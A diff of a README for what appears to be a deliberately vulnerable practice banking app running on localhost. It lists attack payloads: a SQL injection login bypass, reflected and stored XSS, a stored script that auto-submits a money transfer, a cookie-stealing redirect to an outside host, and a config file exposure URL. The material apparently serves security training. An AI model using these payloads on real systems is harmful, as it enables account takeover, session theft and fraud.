@@ -12,23 +12,25 @@ Please note, Google Chrome uses an xss auditor. Really nice, but to get the hang
 # Hacks
 
 ## SQL Injection in login
-swijnberg' OR '1'='1
+`swijnberg' OR '1'='1`
 
 ## XSS account info
-http://localhost:8080/secret.php?page=account-info&account=NL15RABO037592641%3Cscript%3Ealert(123)%3C/script%3E
+`http://localhost:8080/secret.php?page=account-info&account=NL15RABO037592641%3Cscript%3Ealert(123)%3C/script%3E`
 
 ## ID Enummeration account-info
 You are able to ennumerate account id's and see other peoples account info.
 
-## Stored XSS transactions
+## Funny stored XSS that drains the account of the one viewining it
+```
 <script>
 document.getElementById(\'transferForm\').elements[0].value = \'NL15RABO037592641\';
 document.getElementById(\'transferForm\').elements[1].value = \'1000000\';
 document.getElementById(\'transferForm\').elements[2].value = \'Pwned!\';
 document.getElementById(\'transferForm\').elements[3].click();</script>
+```
 
 ## Session Hijack 
-view-source:http://localhost:8080/secret.php?name=Stef%3Cscript%3Edocument.location=%27/stef/kek-session.php?%27%2Bdocument.cookie;%3C/script%3E
+`http://localhost:8080/secret.php?name=Stef%3Cscript%3Edocument.location=%27http://somewhere.com/stef/kek-session.php?%27%2Bdocument.cookie;%3C/script%3E`
 
 ## arbitrairy file exposure 
-http://localhost:8080/secret.php?page=config.ini&account=NL15RABO037592641
+`http://localhost:8080/secret.php?page=config.ini&account=NL15RABO037592641`
